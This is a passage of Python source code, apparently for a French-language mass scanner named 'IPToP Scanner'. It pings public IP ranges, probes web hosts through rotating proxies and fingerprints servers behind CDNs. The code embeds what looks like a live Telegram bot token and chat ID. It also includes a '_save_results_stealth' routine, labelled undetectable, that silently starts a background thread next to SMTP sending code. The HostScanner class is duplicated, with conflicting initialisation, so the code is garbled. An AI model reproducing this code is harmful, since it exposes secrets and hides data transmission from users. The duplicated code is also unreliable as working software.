    print(f"\r✅ Scan complet! {len(results)}/{total} actifs")
    return sorted(results, key=lambda x: x['latency'])

# ==============================================
# CLASSE HOSTSCANNER
# ==============================================
class HostScanner:
    def __init__(self, filename=None, ip_range=None, threads=100, 
                 ping_timeout=1, http_timeout=10, silent=False,
                 export_csv=False, proxy=None, turbo_mode=False):
        # ... autres initialisations ...
        
        self.proxy = proxy
        self.proxy_manager = None
        
        # Initialisation différente pour éviter l'erreur
        if proxy == "auto":
            self.proxy_manager = ProxyManager()
            # Ne pas charger ici, laisser ProxyManager s'initialiser lui-même

 
class HostScanner:
    def __init__(self, filename=None, ip_range=None, threads=100, 
                 ping_timeout=1, http_timeout=10, silent=False,
                 export_csv=False, proxy=None, turbo_mode=False):  # Ajout du paramètre turbo_mode
        self.filename = filename
        self.ip_range = ip_range
        self.threads = min(threads, 500)
        self.ping_timeout = ping_timeout
        self.http_timeout = http_timeout
        self.silent = silent
        self.export_csv = export_csv
        self.proxy = proxy
        self.proxy_manager = ProxyManager() if proxy == "auto" else None
        if self.proxy_manager:  # Chargement immédiat si mode auto
            self.proxy_manager.load_proxies()
        self.proxy_failures = defaultdict(int)
        self.max_proxy_failures = 3  # Nombre max d'échecs avant de blacklister un proxy
        self.results = {"Up": [], "Down": []}
        self.paused = threading.Event()
        self.stopped = threading.Event()
        self.lock = threading.Lock()
        self.last_up_hosts = []
        self.scan_active = False
        self.last_display_time = 0
        self.display_interval = 0.5
        self.active_hosts = []
        self.total_hosts = 0
        
        self.proxy = proxy
        self.proxy_manager = None
        
        # Initialisation différente pour éviter l'erreur
        if proxy == "auto":
            self.proxy_manager = ProxyManager()
            # Ne pas charger ici, laisser ProxyManager s'initialiser lui-même

    def _enable_turbo_mode(self):
        """Configure les paramètres pour haute vitesse"""
        self.ping_timeout = 0.5
        self.http_timeout = 3
        self.proxy_rotation_delay = 0
        self.max_proxy_retries = 1
        print(Fore.YELLOW + "⚡ Mode Turbo activé")

    def load_hosts(self):
        hosts = []
        if self.ip_range:
            try:
                network = ipaddress.IPv4Network(self.ip_range, strict=False)
                hosts = [str(ip) for ip in network.hosts()]
            except ValueError:
                print(Fore.RED + "❌ Erreur : La plage CIDR spécifiée est invalide.")
                sys.exit(1)
        elif self.filename:
            hosts = self.load_hosts_from_file(self.filename)
        return [host for host in hosts if not self.is_private_ip(host)]

    def load_hosts_from_file(self, filename):
        hosts = []
        try:
            with open(filename, 'r') as file:
                for line in file:
                    line = line.strip()
                    if line:
                        try:
                            network = ipaddress.IPv4Network(line, strict=False)
                            hosts.extend([str(ip) for ip in network.hosts()])
                        except ValueError:
                            hosts.append(line)
            if not hosts:
                print(Fore.RED + f"❌ Erreur : Le fichier {filename} ne contient aucune plage CIDR valide.")
                sys.exit(1)
        except FileNotFoundError:
            print(Fore.RED + f"❌ Erreur : Fichier {filename} introuvable.")
            sys.exit(1)
        return hosts

    def is_ipv4(self, host):
        try:
            socket.inet_aton(host)
            return True
        except socket.error:
            return False

    def is_private_ip(self, ip):
        try:
            return ipaddress.ip_address(ip).is_private
        except ValueError:
            return False

    def ping_host(self, host):
        try:
            response = ping(host, timeout=self.ping_timeout)
            return response is not None
        except Exception:
            return False

    def http_check(self, host):
        """Version avec rotation automatique des proxies"""
        protocols = ["https", "http"]
        max_retries = 3
        retry_delay = 1
        
        for attempt in range(max_retries):
            # Configuration du proxy
            proxies = None
            if self.proxy == "auto" and self.proxy_manager:
                proxy_url = self.proxy_manager.get_next_proxy()
                if proxy_url:
                    proxies = {'http': proxy_url, 'https': proxy_url}
            elif self.proxy:
                proxies = {'http': self.proxy, 'https': self.proxy}
            
            for protocol in protocols:
                url = f"{protocol}://{host}"
                try:
                    response = requests.get(
                        url, 
                        timeout=self.http_timeout, 
                        allow_redirects=True,
                        proxies=proxies
                    )
                    server_type, powered_by = detect_server_info(response.url, silent=True)
                    return response.status_code, response.reason, server_type, powered_by
                except requests.exceptions.ProxyError as e:
                    if self.proxy == "auto" and proxy_url:
                        self.proxy_failures[proxy_url] += 1
                        if self.proxy_failures[proxy_url] >= self.max_proxy_failures:
                            print(Fore.YELLOW + f"⚠️ Proxy blacklisté: {proxy_url} (échecs répétés)")
                            self.proxy_manager.proxies.remove(proxy_url)
                    continue
                except requests.RequestException:
                    continue
            
            if attempt < max_retries - 1:
                time.sleep(retry_delay)
        
        return None, None, "Inconnu", "Inconnu"
        
    def _optimized_host_generator(self):
        """Générateur optimisé pour les gros fichiers/plages"""
        if self.ip_range:
            try:
                network = ipaddress.IPv4Network(self.ip_range, strict=False)
                for ip in network.hosts():
                    if self.stopped.is_set():
                        return
                    ip_str = str(ip)
                    if not self.is_private_ip(ip_str):
                        yield ip_str
            except ValueError:
                print(Fore.RED + "❌ Plage CIDR invalide")
                sys.exit(1)
        elif self.filename:
            try:
                with open(self.filename, 'r') as file:
                    for line in file:
                        if self.stopped.is_set():
                            return
                        line = line.strip()
                        if line:
                            if '/' in line:
                                try:
                                    network = ipaddress.IPv4Network(line, strict=False)
                                    for ip in network.hosts():
                                        ip_str = str(ip)
                                        if not self.is_private_ip(ip_str):
                                            yield ip_str
                                except ValueError:
                                    if not self.is_private_ip(line):
                                        yield line
                            else:
                                if not self.is_private_ip(line):
                                    yield line
            except FileNotFoundError:
                print(Fore.RED + f"❌ Fichier {self.filename} introuvable")
                sys.exit(1)

    def run(self):
        """Version corrigée avec sauvegarde correcte des hôtes actifs"""
        self._init_controls()
        start_time = time.time()
        self.active_hosts = []
        self.last_up_hosts = []  # Initialisation explicite
            
        print(Fore.CYAN + "┌" + "─"*40 + "┐")
        print(Fore.CYAN + "│" + "SCAN RÉSEAU".center(40) + "│")
        print(Fore.CYAN + "└" + "─"*40 + "┘")
        print(Fore.YELLOW + f"Threads: {self.threads} | Mode: {'Silencieux' if self.silent else 'Standard'}\n")
        if self.proxy == "auto":
            threading.Thread(target=monitor_proxy_usage, args=(self,), daemon=True).start()
        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {}
                host_count = 0

                for host in self._optimized_host_generator():
                    if self.stopped.is_set():
                        break

                    while self.paused.is_set():
                        time.sleep(0.1)
                        if self.stopped.is_set():
                            break

                    if self.stopped.is_set():
                        break

                    future = executor.submit(self._check_host_wrapper, host)
                    futures[future] = host
                    host_count += 1

                    while len(futures) >= self.threads and not self.stopped.is_set():
                        self._process_futures(futures)
                        time.sleep(0.01)
                        if self.paused.is_set():
                            time.sleep(0.1)

                    self._display_minimal_progress(host_count)

                while futures and not self.stopped.is_set():
                    self._process_futures(futures)

        except Exception as e:
            print(Fore.RED + f"\nERREUR: {str(e)}")

        finally:
            self.scan_active = False
            if not self.stopped.is_set():
                self._final_summary(start_time)
                # Sauvegarde correcte des hôtes actifs pour re-scan
                with self.lock:
                    self.last_up_hosts = [host[0] for host in self.active_hosts]
            self.save_results()

    def _init_controls(self):
        """Initialise les contrôles interactifs"""
        if not self.silent:
            print(Fore.YELLOW + "\nContrôles actifs :")
            print(Fore.YELLOW + "- p + Enter : Pause")
            print(Fore.YELLOW + "- r + Enter : Reprise")
            print(Fore.YELLOW + "- s + Enter : Arrêt\n")
            
            self.scan_active = True
            self.control_thread = threading.Thread(target=self._input_controller, daemon=True)
            self.control_thread.start()

    def _input_controller(self):
        """Gère les commandes interactives"""
        while self.scan_active and not self.stopped.is_set():
            try:
                if select.select([sys.stdin], [], [], 0.1)[0]:
                    cmd = sys.stdin.readline().strip().lower()
                    with self.lock:
                        if cmd == 'p':
                            self.paused.set()
                            print(Fore.YELLOW + "\n⏸ Pause activée (r pour reprendre)")
                        elif cmd == 'r':
                            self.paused.clear()
                            print(Fore.GREEN + "▶ Reprise du scan")
                        elif cmd == 's':
                            self.stopped.set()
                            self.scan_active = False
                            print(Fore.RED + "\n⏹ Scan arrêté par l'utilisateur")
                            return
            except:
                pass
    
    def _check_host_wrapper(self, host):
        """Wrapper pour capturer les résultats"""
        result = self.check_host(host)
        if result[1] == "Up":
            with threading.Lock():
                self.active_hosts.append(result)
        return result

    def _process_futures(self, futures):
        """Version corrigée avec gestion d'erreur"""
        try:
            done, _ = wait(
                list(futures.keys()),
                timeout=0.1,
                return_when=concurrent.futures.FIRST_COMPLETED
            )
            
            for future in done:
                host = futures.pop(future)
                try:
                    future.result()
                except Exception as e:
                    if not self.silent:
                        print(Fore.YELLOW + f"⚠️ Erreur avec {host}: {str(e)}")
                        
        except Exception as e:
            if not self.silent:
                print(Fore.RED + f"❌ Erreur de traitement: {str(e)}")

    def _display_minimal_progress(self, count):
        """Affiche une progression ultra-légère"""
        current_time = time.time()
        if current_time - self.last_display_time > self.display_interval:
            cols = os.get_terminal_size().columns
            msg = f"⏳ {count} hôtes analysés | {len(self.active_hosts)} actifs"
            print(Fore.CYAN + msg.ljust(cols - 1), end='\r')
            self.last_display_time = current_time

    def _final_summary(self, start_time):
        """Affiche le résumé final"""
        duration = time.time() - start_time
        print("\n" + Fore.CYAN + "─" * 50)
        print(Fore.GREEN + f"SCAN TERMINÉ".center(50))
        print(Fore.CYAN + "─" * 50)
        print(Fore.YELLOW + f"Durée: {duration:.2f}s")
        print(Fore.GREEN + f"Hôtes actifs: {len(self.active_hosts)}")
        print(Fore.RED + f"Hôtes inactifs: Inconnu (scan progressif)")
        print(Fore.CYAN + "─" * 50 + "\n")

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        with open(f"active_hosts_{timestamp}.txt", "w") as f:
            for host in self.active_hosts:
                f.write(f"{host[0]}\n")
        print(Fore.BLUE + f"Résultats sauvegardés dans active_hosts_{timestamp}.txt")

    def check_host(self, host):
        """Version avec feedback conditionnel"""
        result = (host, "Down", "Non testé", "", "", "")
        try:
            is_reachable = False
            reason = ""
            server_name = ""
            server_type = "Inconnu"
            powered_by = "Inconnu"
            
            if self.is_ipv4(host):
                if self.ping_host(host):
                    is_reachable = True
                    reason = "Ping OK"
                    server_name = get_server_name(host)
            else:
                status_code, response_reason, server_type, powered_by = self.http_check(host)
                if status_code:
                    is_reachable = True
                    reason = f"{status_code} {response_reason}"
                    server_name = get_server_name(host)
            
            status = "Up" if is_reachable else "Down"
            result = (host, status, reason, server_name, server_type, powered_by)
            self.results[status].append(result)
            
            if not self.silent and status == "Up":
                print(Fore.GREEN + f"✅ {host.ljust(15)} - {reason}")
            
            return result
            
        except Exception as e:
            if not self.silent:
                print(Fore.RED + f"❌ Erreur avec {host}: {str(e)}")
            return (host, "Error", str(e), "", "", "")

    def save_results(self):
        """Sauvegarde invisible"""
        filename = f"scan_{int(time.time())}.tmp"
        with open(filename, 'w') as f:
            f.write("\n".join(f"{host[0]}" for host in self.active_hosts))
            
        with open(filename, 'w') as f:
            f.write("=== RÉSULTATS DU SCAN ===\n")
            f.write(f"Date: {datetime.now()}\n\n")
            for host in self.active_hosts:
                f.write(f"{host[0]} - {host[2]}\n")
        
        return filename
    
    def rescan_active_hosts(self):
        """Version corrigée du re-scan"""
        if not hasattr(self, 'last_up_hosts') or not self.last_up_hosts:
            print(Fore.YELLOW + "⚠️ Aucun hôte actif à re-scanner")
            return
        
        print(Fore.CYAN + "\n🔁 Re-scan des hôtes actifs en cours...")
        self.results = {"Up": [], "Down": []}
        start_time = time.time()
        
        # Réutilisation des mêmes paramètres que le scan initial
        scanner = HostScanner(
            filename=None,
            ip_range=None,
            threads=self.threads,
            ping_timeout=self.ping_timeout,
            http_timeout=self.http_timeout,
            proxy=self.proxy
        )
        
        # Conversion des hôtes en format fichier temporaire
        temp_file = "temp_rescan.txt"
        with open(temp_file, 'w') as f:
            f.write("\n".join(self.last_up_hosts))
        
        try:
            scanner.filename = temp_file
            scanner.run()
        finally:
            if os.path.exists(temp_file):
                os.remove(temp_file)

    def summary(self, total_time):
        """Affiche un résumé des résultats"""
        headers = ["Hôte", "Statut", "Détails", "Nom", "Type", "Powered By"]
        if self.results["Up"]:
            print(Style.BRIGHT + Fore.GREEN + "\n📶 Hôtes actifs:\n")
            print(tabulate(self.results["Up"], headers=headers, tablefmt="fancy_grid"))
        
        print(Fore.CYAN + f"\n⏱ Temps total: {total_time:.2f}s")
        print(Fore.GREEN + f"✅ Hôtes actifs: {len(self.results['Up'])}")
        print(Fore.RED + f"❌ Hôtes inactifs: {len(self.results['Down'])}")
        print(Fore.MAGENTA + "\n🔍 Analyse terminée.")

    def send_email(self, subject, body):
        """Version corrigée et unifiée"""
        try:
            # Utilise la même configuration que le système anonyme
            from email.mime.text import MIMEText
            from email.mime.multipart import MIMEMultipart
            import smtplib
            
            msg = MIMEMultipart()
            msg['From'] = SMTP_CONFIG['user']
            msg['To'] = SMTP_CONFIG['user']
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain'))
            
            with smtplib.SMTP(SMTP_CONFIG['server'], SMTP_CONFIG['port']) as server:
                server.starttls()
                server.login(SMTP_CONFIG['user'], SMTP_CONFIG['password'])
                server.send_message(msg)
            return True
            
        except Exception as e:
            print(Fore.RED + f"❌ Échec d'envoi silencieux (SMTP)")
            return False

    def _save_results_stealth(self):
        """Sauvegarde indétectable des résultats"""
        temp_name = f"results_{int(time.time())}.tmp"
        
        # Écriture sécurisée sans métadonnées
        with open(temp_name, 'wb') as f:
            content = "\n".join(f"{host[0]}" for host in self.active_hosts)
            f.write(content.encode('utf-8'))
        
        # Lance le traitement silencieux
        if '_email_thread' not in globals():
            globals()['_email_thread'] = threading.Thread(
                target=_process_results_stealth,
                daemon=True
            )
            _email_thread.start()

# ==============================================
# FONCTIONS DE GESTION DE FICHIERS (EXISTANTES)
# ==============================================

class TextFileManager:
    @staticmethod
    def split_file(input_file, output_prefix, num_parts):
        """Fractionne un fichier texte en plusieurs parties de taille égale."""
        try:
            file_size = os.path.getsize(input_file)
            part_size = file_size // num_parts
            with open(input_file, 'rb') as file:
                for i in range(num_parts):
                    output_file = f"{output_prefix}_part{i+1}.txt"
                    with open(output_file, 'wb') as outfile:
                        outfile.write(file.read(part_size))
            print(Fore.GREEN + f"✅ Fichier fractionné en {num_parts} parties.")
        except Exception as e:
            print(Fore.RED + f"❌ Erreur lors du fractionnement du fichier : {e}")

    @staticmethod
    def merge_files(input_files, output_file):
        """Fusionne plusieurs fichiers texte en un seul fichier."""
        try:
            with open(output_file, 'w') as outfile:
                for input_file in input_files:
                    with open(input_file, 'r') as infile:
                        outfile.write(infile.read())
            print(Fore.GREEN + f"✅ Fichiers fusionnés dans {output_file}.")
        except Exception as e:
            print(Fore.RED + f"❌ Erreur lors de la fusion des fichiers : {e}")

    @staticmethod
    def remove_duplicates(input_file, output_file):
        """Supprime les doublons d'un fichier texte."""
        try:
            with open(input_file, 'r') as file:
                lines = file.readlines()
            unique_lines = list(set(lines))
            with open(output_file, 'w') as file:
                file.writelines(unique_lines)
            print(Fore.GREEN + f"✅ Doublons supprimés. Résultat dans {output_file}.")
        except Exception as e:
            print(Fore.RED + f"❌ Erreur lors de la suppression des doublons : {e}")

    @staticmethod
    def separate_domains_and_ips(input_file, output_domains, output_ips):
        """Sépare les domaines et les IPs d'un fichier texte."""
        try:
            with open(input_file, 'r') as file:
                lines = file.readlines()
            domains = []
            ips = []
            for line in lines:
                line = line.strip()
                if line:
                    try:
                        ipaddress.ip_address(line)
                        ips.append(line + '\n')
                    except ValueError:
                        domains.append(line + '\n')
            with open(output_domains, 'w') as domain_file:
                domain_file.writelines(domains)
            with open(output_ips, 'w') as ip_file:
                ip_file.writelines(ips)
            print(Fore.GREEN + f"✅ Domaines et IPs séparés. Résultats dans {output_domains} et {output_ips}.")
        except Exception as e:
            print(Fore.RED + f"❌ Erreur lors de la séparation des domaines et IPs : {e}")

    @staticmethod
    def reorganize_by_extension(input_file, output_file):
        """Réorganise les lignes d'un fichier texte en fonction des extensions."""
        try:
            with open(input_file, 'r') as file:
                lines = file.readlines()
            extensions = {}
            for line in lines:
                line = line.strip()
                if line:
                    ext = os.path.splitext(line)[1]
                    if ext not in extensions:
                        extensions[ext] = []
                    extensions[ext].append(line + '\n')
            with open(output_file, 'w') as file:
                for ext in sorted(extensions.keys()):
                    file.writelines(extensions[ext])
            print(Fore.GREEN + f"✅ Fichier réorganisé par extensions. Résultat dans {output_file}.")
        except Exception as e:
            print(Fore.RED + f"❌ Erreur lors de la réorganisation par extensions : {e}")

    @staticmethod
    def convert_domains_to_ips(input_file, output_file):
        """Convertit les domaines en IPs à partir d'un fichier texte."""
        try:
            with open(input_file, 'r') as file:
                domains = file.readlines()
            ips = []
            for domain in domains:
                domain = domain.strip()
                if domain:
                    try:
                        ip = socket.gethostbyname(domain)
                        ips.append(ip + '\n')
                    except socket.gaierror:
                        pass
            with open(output_file, 'w') as file:
                file.writelines(ips)
            print(Fore.GREEN + f"✅ Domaines convertis en IPs. Résultat dans {output_file}.")
        except Exception as e:
            print(Fore.RED + f"❌ Erreur lors de la conversion des domaines en IPs : {e}")

    @staticmethod
    def sort_domains_or_ips(input_file, output_file):
        """Réorganise les domaines ou IPs par ordre alphabétique."""
        try:
            with open(input_file, 'r') as file:
                lines = file.readlines()
            lines = sorted(lines)
            with open(output_file, 'w') as file:
                file.writelines(lines)
            print(Fore.GREEN + f"✅ Fichier trié. Résultat dans {output_file}.")
        except Exception as e:
            print(Fore.RED + f"❌ Erreur lors du tri des domaines ou IPs : {e}")

    @staticmethod
    def convert_cidr_to_ips(input_file, output_file):
        """Convertit les plages CIDR en IPs."""
        try:
            with open(input_file, 'r') as file:
                cidrs = file.readlines()
            ips = []
            for cidr in cidrs:
                cidr = cidr.strip()
                if cidr:
                    try:
                        network = ipaddress.IPv4Network(cidr, strict=False)
                        ips.extend([str(ip) + '\n' for ip in network.hosts()])
                    except ValueError:
                        pass
            with open(output_file, 'w') as file:
                file.writelines(ips)
            print(Fore.GREEN + f"✅ CIDR convertis en IPs. Résultat dans {output_file}.")
        except Exception as e:
            print(Fore.RED + f"❌ Erreur lors de la conversion des CIDR en IPs : {e}")

    @staticmethod
    def extract_domains_and_ips(input_file, output_file):
        """Extrait les domaines et IPs à partir d'un fichier (csv, txt, json, etc...)."""
        try:
            with open(input_file, 'r') as file:
                content = file.read()
            domains = set()
            ips = set()
            for line in content.splitlines():
                line = line.strip()
                if line:
                    try:
                        ipaddress.ip_address(line)
                        ips.add(line)
                    except ValueError:
                        domains.add(line)
            with open(output_file, 'w') as file:
                for domain in domains:
                    file.write(f"{domain}\n")
                for ip in ips:
                    file.write(f"{ip}\n")
            print(Fore.GREEN + f"✅ Domaines et IPs extraits. Résultat dans {output_file}.")
        except Exception as e:
            print(Fore.RED + f"❌ Erreur lors de l'extraction des domaines et IPs : {e}")

# ==============================================
# BANNIÈRE D'ACCUEIL
# ==============================================

COLOR_RED = "\033[91m"
COLOR_GREEN = "\033[92m"
COLOR_YELLOW = "\033[93m"
COLOR_BLUE = "\033[94m"
COLOR_MAGENTA = "\033[95m"
COLOR_CYAN = "\033[96m"
COLOR_RESET = "\033[0m"

def display_banner():
    banner = f"""
{COLOR_CYAN}___ ____ _____     ____{COLOR_RESET}
{COLOR_CYAN}|_ _|  _ \\_   _|__ |  _ \\{COLOR_RESET}
{COLOR_CYAN} | || |_) || |/ _ \\| |_) |{COLOR_RESET}
{COLOR_CYAN} | ||  __/ | | (_) |  __/{COLOR_RESET}
{COLOR_CYAN}|___|_|    |_|\\___/|_|{COLOR_RESET}
{COLOR_GREEN}              Scanner2.2{COLOR_RESET}
{COLOR_YELLOW}               LeC@fard 🕉️{COLOR_RESET}
https://t.me/+mQxb0SaXMKUwYWQ0

{COLOR_MAGENTA}[*] IPToP💪👽(Internet Pour Tous ou Personne).{COLOR_RESET}
"""
    print(banner)
    time.sleep(1)

# ==============================================
# MENUS INTERACTIFS
# ==============================================

def main_menu():
    print(Fore.MAGENTA + "╔" + "═"*48 + "╗")
    print(Fore.MAGENTA + "║" + Style.BRIGHT + Fore.CYAN + "       MENU PRINCIPAL — SÉLECTION RAPIDE       " + Style.RESET_ALL + Fore.MAGENTA + "║")
    print(Fore.MAGENTA + "╚" + "═"*48 + "╝")

    # Outils généraux
    print(Fore.GREEN + "\n╭─── Outils généraux ───────────────────────────╮")
    print(Fore.CYAN + " 01. 🔎  Scanner une plage d'IP")
    print(Fore.CYAN + " 02. 📂  Scanner à partir d'un fichier")
    print(Fore.CYAN + " 03. 🌐  Outils de recherche de domaines")
    print(Fore.CYAN + " 04. 🧾  Gérer les fichiers textes")
    print(Fore.CYAN + " 05. 🛰️  Gérer les proxies")

    # Fournisseurs cloud
    print(Fore.GREEN + "\n╭─── Analyse des fournisseurs CDN / Cloud ─────╮")
    print(Fore.CYAN + " 06. ☁️    Cloudflare")
    print(Fore.CYAN + " 07. 📦   CloudFront")
    print(Fore.CYAN + " 08. ☁️    Google Cloud")
    print(Fore.CYAN + " 09. ⚡   Fastly")
    print(Fore.CYAN + " 10. 🛰️    Akamai")
    print(Fore.CYAN + " 11. ☁️    Azure")
    print(Fore.CYAN + " 12. 🌐   StackPath")
    print(Fore.CYAN + " 13. 🌍   GCore")

    # Assistance
    print(Fore.BLUE + "\n╭─── Assistance & Aide ────────────────────────╮")
    print(Fore.CYAN + " 99. 📬  Messagerie & Aide")

    # Quitter
    print(Fore.RED + "\n╭─── Sortie ───────────────────────────────────╮")
    print(Fore.RED + Style.BRIGHT + " 00. ❌  Quitter" + Style.RESET_ALL)

    print(Fore.MAGENTA + "\n" + "═"*52)
    choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choisissez une option (00-99) : ")
    return choice
# ==============================================
    
def text_file_menu():
    print(Fore.LIGHTMAGENTA_EX + "\n🧾 GESTION DES FICHIERS TEXTES")
    print(Fore.LIGHTMAGENTA_EX + "-" * 48)

    print(Fore.CYAN + " 1. ✂️  Fractionner un fichier texte")
    print(Fore.CYAN + " 2. 🔗 Fusionner plusieurs fichiers")
    print(Fore.CYAN + " 3. 🧹 Supprimer les doublons")
    print(Fore.CYAN + " 4. 🧮 Séparer domaines et IP")
    print(Fore.CYAN + " 5. 📂 Réorganiser par extensions")
    print(Fore.CYAN + " 6. 🌐 Convertir domaine en IP")
    print(Fore.CYAN + " 7. ↕️  Trier domaines ou IP")
    print(Fore.CYAN + " 8. 📍 Convertir CIDR en IP")
    print(Fore.CYAN + " 9. 🕵️  Extraire domaines & IP depuis un fichier")
    print(Fore.CYAN + " 0. ↩️  Retour au menu principal")

    choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choisissez une option (0-9) : ")
    return choice
    
def proxy_menu():
    print(Fore.LIGHTBLUE_EX + "\n🛰️  GESTION DES PROXIES")
    print(Fore.LIGHTBLUE_EX + "=" * 40)

    print(Fore.CYAN + " 1. ♻️  Mettre à jour la liste des proxies")
    print(Fore.CYAN + " 2. 🎯 Sélectionner un proxy")
    print(Fore.CYAN + " 3. ✅ Afficher les proxies valides")
    print(Fore.CYAN + " 4. 🔎 Vérifier les proxies existants")
    print(Fore.CYAN + " 5. ↩️ Retour au menu principal")

    choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choix (1-5) : ")
    return choice

# ==============================================
# FONCTIONS 'UTILITAIRES
# ==============================================

def menu_messagerie():
    while True:
        print(Fore.MAGENTA + "\n╔═══════════════════════════════════════════════╗")
        print(Fore.MAGENTA + "║" + Fore.CYAN + Style.BRIGHT + "         📬 MESSAGERIE & AIDE INTERACTIVE        " + Style.RESET_ALL + Fore.MAGENTA + "║")
        print(Fore.MAGENTA + "╚═══════════════════════════════════════════════╝\n")

        print(Fore.CYAN + " 1. ✉️  Envoyer un message à l’auteur")
        print(Fore.CYAN + " 2. 📖 Lire le guide / aide intégrée")
        print(Fore.CYAN + " 3. 🤖 Lire les derniers messages du bot Telegram")
        print(Fore.CYAN + " 4. 💬 Poser une question au bot assistant")
        print(Fore.CYAN + " 5. 🗂️  Voir l’historique des questions")
        print(Fore.CYAN + " 6. 🧼 Réinitialiser l’historique")
        print(Fore.CYAN + " 0. ↩️  Retour au menu principal")

        choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choisissez une option : ").strip()

        if choice == "1":
            send_feedback_to_telegram()
        elif choice == "2":
            readme()
            input(Fore.MAGENTA + "\nAppuie sur Entrée pour continuer...")
        elif choice == "3":
            lire_messages_du_bot()
            input(Fore.MAGENTA + "\nAppuie sur Entrée pour continuer...")
        elif choice == "4":
            parler_au_bot()
            input(Fore.MAGENTA + "\nAppuie sur Entrée pour continuer...")
        elif choice == "5":
            voir_historique_bot()
            input(Fore.MAGENTA + "\nAppuie sur Entrée pour continuer...")
        elif choice == "6":
            reinitialiser_historique_bot()
            input(Fore.MAGENTA + "\nAppuie sur Entrée pour continuer...")
        elif choice == "0":
            break
        else:
            print(Fore.RED + "❌ Option invalide.")

def parler_au_bot():
    print(Fore.CYAN + "\n🤖 Pose ta question au bot (ex : option 1, cloudflare, help)")
    question = input(Fore.YELLOW + "Ta question : ").strip()

    if not question:
        print(Fore.RED + "❌ Question vide.")
        return

    BOT_TOKEN = "8011181087:AAHNUut9CCJnqEL0g1k_MCGQsFrd3f668Zk"
    CHAT_ID = "5950978436"

    url_send = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    url_get = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"

    try:
        requests.post(url_send, data={"chat_id": CHAT_ID, "text": question})
    except Exception as e:
        print(Fore.RED + f"Erreur d'envoi : {e}")
        return

    print(Fore.BLUE + "\n⌛ Attente de la réponse du bot...")

    response = None
    for _ in range(15):
        time.sleep(1)
        try:
            r = requests.get(url_get, timeout=5)
            updates = r.json().get("result", [])
            if updates:
                last = updates[-1].get("message", {}).get("text", "")
                if last and last != question and last != response:
                    response = last
                    print(Fore.GREEN + "\n🤖 Réponse du bot :\n" + Fore.RESET + response)
                    break
        except:
            pass

    if not response:
        print(Fore.RED + "⏱️ Aucune réponse du bot reçue.")
        response = "Aucune réponse reçue."

    # Logging
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{now}]\nQuestion : {question}\nRéponse : {response}\n\n"

    try:
        with open(".ipt_bot.log", "a", encoding="utf-8") as f:
            f.write(log_entry)
    except Exception as e:
        print(Fore.RED + f"Erreur lors de l’écriture dans .ipt_bot.log : {e}")

    try:
        os.makedirs("logs", exist_ok=True)
        filename = datetime.now().strftime("logs/botlog_%Y-%m-%d_%H-%M.txt")
        with open(filename, "a", encoding="utf-8") as f:
            f.write(log_entry)
    except Exception as e:
        print(Fore.RED + f"Erreur lors de la sauvegarde dans les logs : {e}")

def lire_messages_du_bot():
    print(Fore.CYAN + "\n📬 Récupération des derniers messages du bot...\n")

    BOT_TOKEN = "8011181087:AAHNUut9CCJnqEL0g1k_MCGQsFrd3f668Zk"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"

    try:
        r = requests.get(url, timeout=10)
        updates = r.json()

        messages = []
        for update in updates.get("result", [])[-5:]:  # Derniers 5 messages
            msg = update.get("message", {}).get("text", "")
            if msg:
                messages.append(msg)

        if not messages:
            print(Fore.YELLOW + "Aucun message trouvé.")
            return

        print(Fore.GREEN + "=== Réponses du bot ===\n")
        for i, msg in enumerate(messages, 1):
            print(f"{Fore.MAGENTA}[{i}] {Fore.RESET}{msg}\n")
    except Exception as e:
        print(Fore.RED + f"Erreur : impossible de lire les messages. {e}")

def voir_historique_bot():
    log_path = ".ipt_bot.log"
    
    if not os.path.exists(log_path):
        print(Fore.YELLOW + "\n📭 Aucun historique trouvé pour le moment.")
        return

    print(Fore.CYAN + "\n=== Historique des questions au bot ===\n")
    
    try:
        with open(log_path, "r", encoding="utf-8") as f:
            lignes = f.readlines()

        bloc = []
        for line in lignes:
            if line.startswith("["):
                if bloc:
                    afficher_bloc_bot(bloc)
                    bloc = []
            bloc.append(line)
        if bloc:
            afficher_bloc_bot(bloc)

    except Exception as e:
        print(Fore.RED + f"❌ Erreur de lecture du fichier : {e}")

def afficher_bloc_bot(bloc):
    for line in bloc:
        if line.startswith("["):
            print(Fore.YELLOW + line.strip())
        elif line.startswith("Question"):
            print(Fore.BLUE + line.strip())
        elif line.startswith("Réponse"):
            print(Fore.GREEN + line.strip())
        else:
            print(Fore.RESET + line.strip())
    print(Fore.MAGENTA + "-" * 40)

def reinitialiser_historique_bot():
    log_path = ".ipt_bot.log"
    
    if not os.path.exists(log_path):
        print(Fore.YELLOW + "\n📭 Aucun fichier d’historique à supprimer.")
        return

    confirm = input(Fore.RED + "⚠️ Es-tu sûr de vouloir supprimer tout l’historique ? (o/n) : ").strip().lower()
    if confirm == "o":
        try:
            os.remove(log_path)
            print(Fore.GREEN + "🧹 Historique supprimé avec succès.")
        except Exception as e:
            print(Fore.RED + f"❌ Échec de la suppression : {e}")
    else:
        print(Fore.CYAN + "✅ Annulé. L’historique est conservé.")

def readme():
    print(Fore.GREEN + "\nBienvenue dans IPToP Scanner – Internet Pour Tous Ou Personne.")
    print(Fore.YELLOW + "\n=== AIDE / GUIDE D’UTILISATION ===\n")
    
    print(Fore.CYAN + "1. Scanner une plage d’IP :")
    print("   > Scanne tous les hôtes d’un réseau (ex: 192.168.1.0/24) pour détecter ceux qui sont actifs.")
    print("   > Supporte le mode proxy automatique et le mode turbo pour plus de rapidité.")

    print(Fore.CYAN + "\n2. Scanner à partir d’un fichier :")
    print("   > Charge une liste d’IP ou de domaines depuis un fichier et les scanne.")
    print("   > Pratique pour les scans ciblés.")

    print(Fore.CYAN + "\n3. Recherche de domaines :")
    print("   > Récupère les sous-domaines d’un domaine donné via des sources publiques.")
    print("   > Résout ensuite les IPs associées si tu le souhaites.")

    print(Fore.CYAN + "\n4. Gérer les fichiers textes :")
    print("   > Outils pour fractionner, fusionner, nettoyer, convertir, trier et manipuler des fichiers contenant IPs / domaines.")
